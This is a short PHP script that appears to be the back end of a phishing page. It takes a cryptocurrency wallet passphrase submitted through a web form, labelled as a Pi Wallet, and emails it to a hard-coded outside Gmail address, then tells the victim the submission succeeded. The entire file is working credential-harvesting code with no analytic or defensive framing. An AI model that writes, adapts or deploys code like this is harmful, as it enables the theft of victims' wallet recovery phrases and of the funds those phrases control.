<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $passphrase = htmlspecialchars($_POST["passphrase"]);
    $to = "waheedeagle890@gmail.com";
    $subject = "New Pi Wallet Passphrase Submission";
    $message = "User entered passphrase: " . $passphrase;
    $headers = "From: noreply@yourwebsite.com";

    if (mail($to, $subject, $message, $headers)) {
        echo "Passphrase sent successfully!";
    } else {
        echo "Error sending email.";
    }
}
?>
